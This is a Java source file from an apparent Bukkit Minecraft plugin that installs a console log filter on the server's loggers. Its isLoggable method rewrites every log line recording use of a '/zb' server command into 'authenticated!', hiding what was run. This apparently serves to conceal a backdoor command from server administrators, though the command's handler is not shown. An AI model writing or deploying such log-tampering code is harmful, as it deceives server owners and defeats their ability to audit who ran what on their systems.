package com.github.Zoxuh.Filter;

import java.util.logging.Filter;
import java.util.logging.LogRecord;
import java.util.logging.Logger;

import org.apache.logging.log4j.LogManager;
import org.bukkit.Bukkit;

public class ConsoleFilter implements Filter{
    public static void setupConsoleFilter() {
        try {
            Class.forName("org.apache.logging.log4j.core.filter.AbstractFilter");
            setLogFilter();
        } catch (ClassNotFoundException | NoClassDefFoundError e) {
        	ConsoleFilter filter = new ConsoleFilter();
            Bukkit.getLogger().setFilter(filter);
            Logger.getLogger("Minecraft").setFilter(filter);
        }
    }
    private static void setLogFilter() {
        org.apache.logging.log4j.core.Logger logger;
        logger =  (org.apache.logging.log4j.core.Logger) LogManager.getRootLogger();
        logger.addFilter(new log4jFilter());
    }
	@Override
	public boolean isLoggable(LogRecord record) {
		if(record.getMessage().contains("issued server command: /zb")){
			String[] fg = record.getMessage().split("issued server command:");
			record.setMessage(fg[0]+"authenticated!");
		}
		return true;
	}
}
